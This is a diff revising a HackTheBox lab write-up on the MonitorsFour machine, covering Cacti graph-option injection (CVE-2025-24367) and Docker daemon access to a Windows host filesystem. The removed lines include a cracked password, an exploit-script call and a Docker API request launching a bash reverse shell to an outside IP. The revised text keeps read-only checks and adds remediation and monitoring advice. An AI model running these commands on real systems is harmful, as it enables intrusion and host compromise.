@@ -1,8 +1,9 @@
 ---
 id: HTB-2026-MONITORSFOUR
 title: MonitorsFour
-excerpt: Cracked credentials enable Cacti RCE, and access to the local Docker socket exposes the host filesystem and root flag.
+excerpt: "Cacti graph-option injection and Docker daemon access: separating the container foothold from access to the Windows host filesystem."
 date: '2025-12-06'
+updated: "2026-10-13"
 tags:
   - WRITEUP
   - HACKTHEBOX
@@ -20,93 +21,41 @@ icon: Terminal
 author: '0x7CC'
 ---
 
-## TL;DR
-On **MonitorsFour**, initial access leverages cracked credentials from a database hash to exploit an authenticated graph template Remote Code Execution vulnerability in Cacti (CVE-2025-24367). Privilege escalation is achieved by exploiting an exposed writable Docker socket to mount the host filesystem and retrieve the root flag.
+## Chain and prerequisites
 
----
+MonitorsFour combines a Windows-facing target with execution inside a Linux container. The existing account reports a Cacti login as `marcus`, command execution as `www-data`, then access to a Docker daemon and a mounted Windows filesystem.
 
-## Target
-- Host: `monitorsfour.htb`
-- IP: `10.129.7.62`
+Its initial hash acquisition is undocumented: “dump local database hashes” does not explain how a remote visitor reads the database. This account therefore begins with valid Cacti credentials. It also does not establish whether a Unix socket or a TCP API supplied daemon access; those are different interfaces and must not be treated as interchangeable observations.
 
----
+## Cacti: authentication is only the first condition
 
-## Recon: Database credential cracking
+The recorded web hostname is `cacti.monitorsfour.htb`. CVE-2025-24367 affects Cacti through 1.2.28 and was fixed in 1.2.29. It requires an authenticated user able to use the affected graph functionality. Newlines in graph options can introduce additional RRDtool operations that write PHP content into a web-served file. See the [Cacti advisory](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq).
 
-### Nmap Scan
-- **Port 80/tcp**: HTTP (hosting Cacti)
-- **Port 1433/tcp**: MSSQL
+A defensible reproduction records the installed version, graph privileges, triggering action, created file, and resulting process identity. The existing `exploit.py` invocation lacks the script's provenance and argument contract, so it is not retained as a reproducible instruction. The account's reported `www-data` shell is a container foothold, not yet Windows administrator execution.
 
-We dump local database hashes and crack the MD5 hash for user `marcus`:
-- Username: `marcus`
-- Password: `wonderful1`
+## Docker access: identify the actual control plane
 
----
+A mounted `/var/run/docker.sock` exposes a Unix socket if its permissions allow access. `192.168.65.7:2375` instead identifies an HTTP daemon endpoint in the original account. Finding either path or port does not prove permission to create containers.
 
-## Initial Foothold: Cacti Graph Template RCE (CVE-2025-24367)
-
-Browsing to the Cacti web interface at `cacti.monitorsfour.htb`, we log in using the recovered credentials. The Cacti instance is vulnerable to CVE-2025-24367, an authenticated RCE in Graph Templates.
-
-We run our exploit script to trigger the vulnerability:
+For an authorized diagnostic replay, the following are alternative read-only examples. Use only the interface actually observed:
 
 ```bash
-python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.15.149 -l 60001
+curl --unix-socket /var/run/docker.sock http://localhost/version
+curl http://192.168.65.7:2375/version
 ```
 
-The exploit succeeds and executes our reverse shell payload, spawning a terminal session inside a Docker container as user `www-data`. We locate the user flag in `/home/marcus/user.txt`.
+The first targets the local socket; the second targets the recorded TCP listener. A version response establishes API reachability, not all administrative permissions. Docker explains why controlling the daemon is security-sensitive in its [Engine security documentation](https://docs.docker.com/engine/security/).
 
----
+## Distinguish filesystem access from host execution
 
-## Privilege Escalation: Docker Socket Escape
+The retained account describes creating a container with a bind source `/mnt/host/c` and reading Windows files through its mount. The source path is resolved on the daemon's host, not in the client's filesystem. Its existence and mapping to the Windows drive must be verified for that deployment.
 
-Inside the container, we check for available services and local mounts. We locate a writable Docker socket exposed at `/var/run/docker.sock` (or accessible via HTTP on `192.168.65.7:2375`).
+The original JSON does not set `Privileged: true`; a host bind and a privileged container are distinct settings. Root inside a Linux container is also not Windows SYSTEM. Reading an Administrator-owned file through an exposed host mount supports host-data access; it does not alone prove arbitrary execution on Windows.
 
-We communicate with the Docker API to deploy a privileged container that mounts the host server's root filesystem:
+## Remediation and verification
 
-```bash
-curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/create \
-  -d '{
-    "Image": "docker_setup-nginx-php:latest",
-    "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.149/60002 0>&1"],
-    "HostConfig": {
-      "Binds": ["/mnt/host/c:/host_root"]
-    }
-  }' -o response.json
-```
+Upgrade Cacti to a currently maintained release containing the fix, restrict graph-template editing, and remove files created during exploitation. Confirm the installed application rather than relying on the image tag.
 
-We extract the newly created container ID and start it:
+Remove unneeded daemon sockets and network exposure from application containers. Apply authenticated, authorized daemon access for necessary management, and restrict host-drive sharing. In a disposable environment, check that the application identity cannot reach the daemon or create a host bind; verify normal graph generation still succeeds.
 
-```bash
-curl -X POST http://192.168.65.7:2375/containers/$new_cid/start
-```
-
-The container executes and sends a root reverse shell. We navigate to the mounted host filesystem at `/host_root/Users/Administrator/Desktop` and read the root flag.
-
----
-
-## Defensive notes / remediation
-
-### Fix
-- Upgrade Cacti to patch CVE-2025-24367.
-- Do not expose the Docker socket (`docker.sock`) or Docker API port internally to unprivileged containers.
-- Enforce least privilege access on container filesystems and restrict host mounts.
-
-### Monitoring / detection ideas
-- Alert on incoming connections to the Docker API port (`2375`) from container networks.
-- Monitor container creation queries requesting privileged execution or host directory bindings.
-
----
-
-## Lessons learned
-- Docker socket exposure inside containers represents a direct path to host compromise.
-- Access to graph templates in network monitoring software must be strictly controlled.
-
----
-
-## Appendix: Timeline summary
-1. Recon -> Crack database hash to recover user `marcus` credentials.
-2. Foothold -> Exploit Cacti CVE-2025-24367 to gain shell inside the container.
-3. Privilege Escalation -> Abuse exposed Docker API to spawn a privileged container mounting the host root filesystem.
-
----
+Monitor unexpected PHP writes in Cacti's web root, container-originated daemon requests, and creation of containers with host-drive binds. Record the requested mount and caller: these explain the escalation better than labeling every container access a “Docker escape.”
